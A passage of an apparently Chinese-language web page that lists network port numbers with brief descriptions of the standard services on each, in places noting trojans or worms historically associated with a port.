class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br></pre></td><td class="code"><pre><span class="line">2端口：管理实用程序</span><br><span class="line">3端口：压缩进程</span><br><span class="line">5端口：远程作业登录</span><br><span class="line">7端口：回显</span><br><span class="line">9端口：丢弃</span><br><span class="line">11端口：在线用户</span><br><span class="line">13端口：时间</span><br><span class="line">17端口：每日引用</span><br><span class="line">18端口：消息发送协议</span><br><span class="line">19端口：字符发生器</span><br><span class="line">20端口：FTP文件传输协议(默认数据口)</span><br><span class="line">21端口：FTP文件传输协议(控制)</span><br><span class="line">22端口：SSH远程登录协议</span><br><span class="line">23端口：telnet(终端仿真协议),木马Tiny Telnet Server开放此端口</span><br><span class="line">24端口：预留给个人用邮件系统</span><br><span class="line">25端口：SMTP服务器所开放的端口，用于发送邮件</span><br><span class="line">27端口：NSW 用户系统 FE</span><br><span class="line">29端口：MSG ICP</span><br><span class="line">31端口：MSG验证,木马Master Paradise、HackersParadise开放此端口</span><br><span class="line">33端口：显示支持协议</span><br><span class="line">35端口：预留给个人打印机服务</span><br><span class="line">37端口：时间</span><br><span class="line">38端口：路由访问协议</span><br><span class="line">39端口：资源定位协议</span><br><span class="line">41端口：图形</span><br><span class="line">42端口：主机名服务</span><br><span class="line">43端口：who is服务</span><br><span class="line">44端口：MPM(消息处理模块)标志协议</span><br><span class="line">45端口：消息处理模块</span><br><span class="line">46端口：消息处理模块(默认发送口)</span><br><span class="line">47端口：NI FTP</span><br><span class="line">48端口：数码音频后台服务</span><br><span class="line">49端口：TACACS登录主机协议</span><br><span class="line">50端口：远程邮件检查协议</span><br><span class="line">51端口：IMP(接口信息处理机)逻辑地址维护</span><br><span class="line">52端口：施乐网络服务系统时间协议</span><br><span class="line">53端口：dns域名服务器</span><br><span class="line">54端口：施乐网络服务系统票据交换</span><br><span class="line">55端口：ISI图形语言</span><br><span class="line">56端口：施乐网络服务系统验证</span><br><span class="line">57端口：预留个人用终端访问</span><br><span class="line">58端口：施乐网络服务系统邮件</span><br><span class="line">59端口：预留个人文件服务</span><br><span class="line">60端口：未定义</span><br><span class="line">61端口：NI邮件</span><br><span class="line">62端口：异步通讯适配器服务</span><br><span class="line">63端口：whois++</span><br><span class="line">64端口：通讯接口</span><br><span class="line">65端口：TACACS数据库服务</span><br><span class="line">66端口：Oracle SQL*NET</span><br><span class="line">67端口：引导程序协议服务端</span><br><span class="line">68端口：引导程序协议客户端</span><br><span class="line">69端口：小型文件传输协议</span><br><span class="line">70端口：信息检索协议</span><br><span class="line">71端口：远程作业服务</span><br><span class="line">72端口：远程作业服务</span><br><span class="line">73端口：远程作业服务</span><br><span class="line">74端口：远程作业服务</span><br><span class="line">75端口：预留给个人拨出服务</span><br><span class="line">76端口：分布式外部对象存储</span><br><span class="line">77端口：预留给个人远程作业输入服务</span><br><span class="line">78端口：修正TCP</span><br><span class="line">79端口：查询远程主机在线用户等信息</span><br><span class="line">80端口：http,用于网页浏览,木马Executor开放此端口</span><br><span class="line">81端口：HOST2名称服务</span><br><span class="line">82端口：传输实用程序</span><br><span class="line">83端口：模块化智能终端ML设备</span><br><span class="line">84端口：公用追踪设备</span><br><span class="line">85端口：模块化智能终端ML设备</span><br><span class="line">86端口：Micro Focus Cobol编程语言</span><br><span class="line">87端口：预留给个人终端连接</span><br><span class="line">88端口：Kerberros安全认证系统</span><br><span class="line">89端口：SU/MIT telnet(终端仿真网关)</span><br><span class="line">90端口：DNSIX 安全属性标记图</span><br><span class="line">91端口：MIT Dover假脱机</span><br><span class="line">92端口：网络打印协议</span><br><span class="line">93端口：设备控制协议</span><br><span class="line">94端口：Tivoli对象调度</span><br><span class="line">96端口：DIXIE协议规范</span><br><span class="line">97端口：快速远程虚拟文件协议</span><br><span class="line">98端口：TAC新闻协议</span><br><span class="line">99端口：后门程序ncx99开放此端口</span><br><span class="line">100端口：未知用途</span><br><span class="line">101端口：NIC 主机名称服务</span><br><span class="line">102端口：消息传输代理</span><br><span class="line">103端口：Genesis 点对点传输网络</span><br><span class="line">105端口：信箱名称服务</span><br><span class="line">106端口：3COM-TSMUX开放端口</span><br><span class="line">107端口：远程Telnet服务</span><br><span class="line">108端口：SNA 网关访问服务</span><br><span class="line">109端口：POP2服务器开放此端口,用于接收邮件</span><br><span class="line">110端口：POP3服务器开放此端口,用于接收邮件</span><br><span class="line">111端口：SUN公司的RPC服务所有端口</span><br><span class="line">112端口：McIDAS 数据传输协议</span><br><span class="line">113端口：认证服务，用于鉴别TCP连接的用户</span><br><span class="line">114端口：音频新闻多点服务</span><br><span class="line">115端口：简单文件传输服务</span><br><span class="line">116端口：ANSA REX 通知</span><br><span class="line">117端口：UUCP 路径服务</span><br><span class="line">118端口：SQL 服务</span><br><span class="line">119端口：NEWS新闻组传输协议，承载USENET通信</span><br><span class="line">121端口：木马BO jammerkillahV开放端口</span><br><span class="line">122端口：SMAKY网络</span><br><span class="line">123端口：网络时间协议，蠕虫病毒会利用，一般关闭</span><br><span class="line">128端口：GSS X许可认证</span><br><span class="line">129端口：密码生成器协议</span><br><span class="line">130端口：Cisco软件开放端口</span><br><span class="line">131端口：Cisco软件开放端口</span><br><span class="line">132端口：Cisco软件开放端口</span><br><span class="line">133端口：统计服务</span><br><span class="line">134端口：INGRES-网络服务</span><br><span class="line">135端口：DCOM服务，冲击波病毒利用，不能关闭</span><br><span class="line">136端口：命名系统</span><br><span class="line">137端口：NETBIOS协议应用，为共享开放</span><br><span class="line">138端口：NETBIOS协议应用，为共享开放</span><br><span class="line">139端口：NETBIOS协议应用，为共享开放</span><br><span class="line">140端口：EMFIS数据服务</span><br><span class="line">141端口：EMFIS控制服务</span><br><span class="line">143端口：Interim邮件访问协议</span><br><span class="line">144端口：UMA软件开放端口</span><br><span class="line">145端口：UAAC协议</span><br><span class="line">149端口：AED 512仿真服务</span><br><span class="line">150端口：SQL(结构化查询语言)-网络</span><br><span class="line">152端口：后台文件传输协议</span><br><span class="line">156端口：SQL(结构化查询语言)服务</span><br><span class="line">158端口：PC邮件服务器</span><br><span class="line">159端口：NSS-路由</span><br><span class="line">160端口：SGMP-陷阱</span><br><span class="line">161端口：简单网络管理协议</span><br><span class="line">162端口：SNMP陷阱</span><br><span class="line">163端口：CMIP/TCP 管理</span><br><span class="line">164端口：CMIP/TCP 代理</span><br><span class="line">166端口：Sirius系统</span><br><span class="line">169端口：发送</span><br><span class="line">170端口：网络附言</span><br><span class="line">177端口：x显示管理控制协议，入侵者通过它访问X-windows操作台</span><br><span class="line">178端口：NextStep Window 服务</span><br><span class="line">179端口：边界网关协议</span><br><span class="line">180端口：图表</span><br><span class="line">181端口：统一</span><br><span class="line">184端口：OC服务器</span><br><span class="line">185端口：远程-KIS</span><br><span class="line">186端口：KIS 协议</span><br><span class="line">187端口：应用通信接口</span><br><span class="line">189端口：队列文件传输</span><br><span class="line">190端口：网关进入控制协议</span><br><span class="line">191端口：Prospero 目录服务</span><br><span class="line">192端口：OSU 网络监视系统</span><br><span class="line">193端口：Spider 远程控制协议</span><br><span class="line">194端口：多线交谈协议</span><br><span class="line">197端口：目录地址服务</span><br><span class="line">198端口：目录地址服务监视器</span><br><span class="line">200端口：IBM系统资源控制器</span><br><span class="line">201端口：AppleTalk(Mac机所用的网络协议)路由保证</span><br><span class="line">202端口：AppleTalk(Mac机所用的网络协议)Name Binding</span><br><span class="line">203端口：AppleTalk(Mac机所用的网络协议)未用端口</span><br><span class="line">204端口：AppleTalk(Mac机所用的网络协议)回显</span><br><span class="line">205端口：AppleTalk(Mac机所用的网络协议)未用端口</span><br><span class="line">206端口：AppleTalk(Mac机所用的网络协议)区信息</span><br><span class="line">207端口：AppleTalk(Mac机所用的网络协议)未用端口</span><br><span class="line">208端口：AppleTalk(Mac机所用的网络协议)未用端口</span><br><span class="line">209端口：快速邮件传输协议</span><br><span class="line">210端口：ANSI(美国国家标准协会)Z39.50</span><br><span class="line">211端口：Texas Instruments 914C/G终端</span><br><span class="line">213端口：IPX(以太网所用的协议)</span><br><span class="line">218端口：Netix消息记录协议</span><br><span class="line">219端口：Unisys ARPs</span><br><span class="line">220端口：交互邮件访问协议 v3</span><br><span class="line">223端口：证书分发中心</span><br><span class="line">224端口：masq拨号器</span><br><span class="line">241端口：预留端口 (224-241)</span><br><span class="line">245端口：链接</span><br><span class="line">246端口：显示系统协议</span><br><span class="line">257端口：安全电子交易系统</span><br><span class="line">258端口：Yak Winsock 个人聊天</span><br><span class="line">259端口：有效短程遥控</span><br><span class="line">260端口：开放端口</span><br><span class="line">261端口：IIOP 基于TLS/SSL的命名服务</span><br><span class="line">266端口：SCSI(小型计算机系统接口)on ST</span><br><span class="line">267端口：Tobit David服务层</span><br><span class="line">268端口：Tobit David复制</span><br><span class="line">281端口：个人连结</span><br><span class="line">282端口：Cable端口A/X</span><br><span class="line">286端口：FXP通信</span><br><span class="line">308端口：Novastor备份</span><br><span class="line">313端口：Magenta逻辑</span><br><span class="line">318端口：PKIX时间标记</span><br><span class="line">333端口：Texar安全端口</span><br><span class="line">344端口：Prospero数据存取协议</span><br><span class="line">345端口：Perf分析工作台</span><br><span class="line">346端口：Zebra服务器</span><br><span class="line">347端口：Fatmen服务器</span><br><span class="line">348端口：Cabletron管理协议</span><br><span class="line">358端口：Shrink可上网家电协议</span><br><span class="line">359端口：网络安全风险管理协议</span><br><span class="line">362端口：SRS发送</span><br><span class="line">363端口：RSVP隧道</span><br><span class="line">372端口：列表处理</span><br><span class="line">373端口：Legend公司</span><br><span class="line">374端口：Legend公司</span><br><span class="line">376端口：AmigaEnvoy网络查询协议</span><br><span class="line">377端口：NEC公司</span><br><span class="line">378端口：NEC公司</span><br><span class="line">379端口：TIA/EIA/IS-99调制解调器客户端</span><br><span class="line">380端口：TIA/EIA/IS-99调制解调器服务器</span><br><span class="line">381端口：hp(惠普)性能数据收集器</span><br><span class="line">382端口：hp(惠普)性能数据控制节点</span><br><span class="line">383端口：hp(惠普)性能数据警报管理</span><br><span class="line">384端口：远程网络服务器系统</span><br><span class="line">385端口：IBM应用程序</span><br><span class="line">386端口：ASA信息路由器定义文件.</span><br><span class="line">387端口：Appletalk更新路由.</span><br><span class="line">389端口：轻型目录访问协议</span><br><span class="line">395端口：网络监视控制协议</span><br><span class="line">396端口：Novell(美国Novell公司)Netware(Novell公司出的网络操作系统)over IP</span><br><span class="line">400端口：工作站解决方案</span><br><span class="line">401端口：持续电源</span><br><span class="line">402端口：Genie协议</span><br><span class="line">406端口：交互式邮件支持协议</span><br><span class="line">408端口：Prospero资源管理程序</span><br><span class="line">409端口：Prospero资源节点管理.</span><br><span class="line">410端口：DEC(数据设备公司)远程调试协议</span><br><span class="line">411端口：远程MT协议</span><br><span class="line">412端口：陷阱协定端口</span><br><span class="line">413端口：存储管理服务协议</span><br><span class="line">414端口：信息查询</span><br><span class="line">415端口：B网络</span><br><span class="line">423端口：IBM操作计划和控制开端</span><br><span class="line">424端口：IBM操作计划和控制追踪</span><br><span class="line">425端口：智能计算机辅助设计</span><br><span class="line">427端口：服务起位置</span><br><span class="line">434端口：移动ip代理</span><br><span class="line">435端口：移动ip管理</span><br><span class="line">443端口：基于TLS/SSL的网页浏览端口，能提供加密和通过安全端口传输的另一种HTTP</span><br><span class="line">444端口：简单网络内存分页协议</span><br><span class="line">445端口：Microsoft-DS，为共享开放，震荡波病毒利用，一般应关闭</span><br><span class="line">446端口：DDM-远程关系数据库访问</span><br><span class="line">447端口：DDM-分布式文件管理</span><br><span class="line">448端口：DDM-使用安全访问远程数据库</span><br><span class="line">456端口：木马HACKERS PARADISE开放此端口</span><br><span class="line">458端口：apple quick time软件开放端口</span><br><span class="line">459端口：ampr-rcmd命令</span><br><span class="line">464端口：k密码服务</span><br><span class="line">469端口：广播控制协议</span><br><span class="line">470端口：scx-代理</span><br><span class="line">472端口：ljk-登陆</span><br><span class="line">481端口：Ph服务</span><br><span class="line">487端口：简单异步文件传输</span><br><span class="line">489端口：nest-协议</span><br><span class="line">491端口：go-登陆</span><br><span class="line">499端口：ISO ILL协议</span><br><span class="line">500端口：Internet密钥交换，Lsass开放端口，不能关闭</span><br><span class="line">509端口：陷阱</span><br><span class="line">510端口：FirstClass协议</span><br><span class="line">512端口：远程进程执行</span><br><span class="line">513端口：远程登陆</span><br><span class="line">514端口：cmd命令</span><br><span class="line">515端口：spooler</span><br><span class="line">516端口：可视化数据</span><br><span class="line">518端口：交谈</span><br><span class="line">519端口：unix时间</span><br><span class="line">520端口：扩展文件名称服务器</span><br><span class="line">525端口：时间服务</span><br><span class="line">526端口：新日期</span><br><span class="line">529端口：在线聊天系统服务</span><br><span class="line">530端口：远程过程调用</span><br><span class="line">531端口：聊天</span><br><span class="line">532端口：读新闻</span><br><span class="line">533端口：紧急广播端口</span><br><span class="line">534端口：MegaMedia管理端</span><br><span class="line">537端口：网络流媒体协议</span><br><span class="line">542端口：商业</span><br><span class="line">543端口：Kerberos(软件)v4/v5</span><br><span class="line">544端口：krcmd命令</span><br><span class="line">546端口：DHCPv6 客户端</span><br><span class="line">547端口：DHCPv6 服务器</span><br><span class="line">552端口：设备共享</span><br><span class="line">554端口：Real Time Stream控制协议</span><br><span class="line">555端口：木马PhAse1.0、Stealth Spy、IniKiller开放此端口</span><br><span class="line">556端口：远距离文件服务器</span><br><span class="line">563端口：基于TLS/SSL的网络新闻传输协议</span><br><span class="line">564端口：plan 9文件服务</span><br><span class="line">565端口：whoami查询</span><br><span class="line">566端口：streettalk</span><br><span class="line">567端口：banyan-rpc(远程过程调用)</span><br><span class="line">568端口：DPA成员资格</span><br><span class="line">569端口：MSN成员资格</span><br><span class="line">570端口：demon(调试监督程序)</span><br><span class="line">571端口：udemon(调试监督程序)</span><br><span class="line">572端口：声纳</span><br><span class="line">573端口：banyan-贵宾</span><br><span class="line">574端口：FTP软件代理系统</span><br><span class="line">581端口：Bundle Discovery 协议</span><br><span class="line">582端口：SCC安全</span><br><span class="line">583端口：Philips视频会议</span><br><span class="line">584端口：密钥服务器</span><br><span class="line">585端口：IMAP4+SSL (Use 993 instead)</span><br><span class="line">586端口：密码更改</span><br><span class="line">587端口：申请</span><br><span class="line">589端口：Eye连结</span><br><span class="line">595端口：CAB协议</span><br><span class="line">597端口：PTC名称服务</span><br><span class="line">598端口：SCO网络服务器管理3</span><br><span class="line">599端口：Aeolon Core协议</span><br><span class="line">600端口：Sun IPC(进程间通讯)服务器</span><br><span class="line">601端口：可靠系统登陆服务</span><br><span class="line">604端口：通道</span><br><span class="line">606端口：Cray统一资源管理</span><br><span class="line">608端口：发送人-传递/提供 文件传输器</span><br><span class="line">609端口：npmp-陷阱</span><br><span class="line">610端口：npmp-本地</span><br><span class="line">611端口：npmp-gui( 图形用户界面)</span><br><span class="line">612端口：HMMP指引</span><br><span class="line">613端口：HMMP操作</span><br><span class="line">614端口：SSL(加密套接字协议层)shell(壳)</span><br><span class="line">615端口：Internet配置管理</span><br><span class="line">616端口：SCO(Unix系统)系统管理服务器</span><br><span class="line">617端口：SCO桌面管理服务器</span><br><span class="line">619端口：Compaq(康柏公司)EVM</span><br><span class="line">620端口：SCO服务器管理</span><br><span class="line">623端口：ASF远程管理控制协议</span><br><span class="line">624端口：Crypto管理</span><br><span class="line">631端口：IPP (Internet打印协议)</span><br><span class="line">633端口：服务更新(Sterling软件)</span><br><span class="line">637端口：局域网服务器</span><br><span class="line">641端口：repcmd命令</span><br><span class="line">647端口：DHCP(动态主机配置协议)Failover</span><br><span class="line">648端口：注册登记协议(RRP)</span><br><span class="line">649端口：Cadview-3d软件协议</span><br><span class="line">666端口：木马Attack FTP、Satanz Backdoor开放此端口</span><br><span class="line">808端口：ccproxy http/gopher/ftp (over http)协议</span><br><span class="line">1001端口：木马Silencer，WebEx开放端口</span><br><span class="line">1011端口：木马Doly开放端口</span><br><span class="line">1024端口：动态端口的开始,木马yai开放端口</span><br><span class="line">1025端口：inetinfo.exe(互联网信息服务)木马netspy开放端口</span><br><span class="line">1026端口：inetinfo.exe(互联网信息服务)</span><br><span class="line">1027端口：应用层网关服务</span><br><span class="line">1030端口：应用层网关服务</span><br><span class="line">1031端口：BBN IAD</span><br><span class="line">1033端口：本地网络信息端口</span><br><span class="line">1034端口：同步通知</span><br><span class="line">1036端口：安全部分传输协议</span><br><span class="line">1070端口：木马Psyber Stream，Streaming Audio开放端口</span><br><span class="line">1071端口：网络服务开放端口</span><br><span class="line">1074端口：网络服务开放端口</span><br><span class="line">1080端口：Socks这一协议以通道方式穿过防火墙，允许防火墙后面的人通过一个IP地址访问INTERNET</span><br><span class="line">1110端口：卡巴斯基反病毒软件开放此端口</span><br><span class="line">1125端口：卡巴斯基反病毒软件开放此端口</span><br><span class="line">1203端口：许可证生效端口</span><br><span class="line">1204端口：登陆请求监听端口</span><br><span class="line">1206端口：Anthony数据端口</span><br><span class="line">1222端口：SNI R&amp;D网络端口</span><br><span class="line">1233端口：普遍的附录服务器端口</span><br><span class="line">1234端口：木马SubSeven2.0、Ultors Trojan开放此端口</span><br><span class="line">1243端口：木马SubSeven1.0/1.9开放此端口</span><br><span class="line">1245端口：木马Vodoo，GabanBus，NetBus，Vodoo开放此端口</span><br><span class="line">1273端口：EMC-网关端口</span><br><span class="line">1289端口：JWalk服务器端口</span><br><span class="line">1290端口：WinJa服务器端口</span><br><span class="line">1333端口：密码策略(网络服务)(svchost.exe)</span><br><span class="line">1334端口：网络服务(svchost.exe)</span><br><span class="line">1335端口：数字公正协议</span><br><span class="line">1336端口：即时聊天协议(svchost.exe)</span><br><span class="line">1349端口：注册网络协议端口</span><br><span class="line">1350端口：注册网络协议端口</span><br><span class="line">1371端口：富士通配置协议端口</span><br><span class="line">1372端口：富士通配置协议端口</span><br><span class="line">1374端口：EPI软件系统端口</span><br><span class="line">1376端口：IBM个人-个人软件端口</span><br><span class="line">1377端口：Cichlid许可证管理端口</span><br><span class="line">1378端口：Elan许可证管理端口</span><br><span class="line">1380端口：Telesis网络许可证管理端口</span><br><span class="line">1381端口：苹果网络许可证管理端口</span><br><span class="line">1386端口：CheckSum 许可证管理端口</span><br><span class="line">1387端口：系统开放端口(rundll32.exe)</span><br><span class="line">1388端口：数据库高速缓存端口</span><br><span class="line">1389端口：文档管理端口</span><br><span class="line">1390端口：存储控制器端口</span><br><span class="line">1391端口：存储器存取服务器端口</span><br><span class="line">1392端口：打印管理端口</span><br><span class="line">1393端口：网络登陆服务器端口</span><br><span class="line">1394端口：网络登陆客户端端口</span><br><span class="line">1395端口：PC工作站管理软件端口</span><br><span 